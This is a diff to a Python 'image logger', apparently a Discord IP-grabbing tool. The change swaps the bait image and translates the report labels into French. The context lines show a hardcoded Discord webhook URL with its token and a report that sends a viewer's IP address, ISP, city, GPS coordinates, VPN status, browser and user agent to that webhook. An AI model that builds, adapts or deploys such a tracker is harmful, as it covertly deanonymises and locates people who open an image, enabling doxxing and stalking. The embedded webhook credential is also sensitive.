@@ -13,7 +13,7 @@ __author__ = "Soo Web"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1110658547865362492/V4sfV4EaF8lMDqqeKi9UW44OhxZC3pIcthwjJBqP54iD0p-oBmeF_GdrsmjpCuXZULja",
-    "image": "https://songazine.fr/v2/wp-content/uploads/2016/06/saez.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://pbs.twimg.com/media/Ef8JkA8X0AImYXB?format=jpg&name=large", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -152,22 +152,22 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **FAI:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Pays:** `{info['country'] if info['country'] else 'Unknown'}`
 > **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Ville:** `{info['city'] if info['city'] else 'Unknown'}`
 > **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Fuseau horaire:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
 **PC Info:**
 > **OS:** `{os}`
-> **Browser:** `{browser}`
+> **Navigateur:** `{browser}`
 
-**User Agent:**
+**Agent utilisateur:**
 ```
 {useragent}
 ```""",
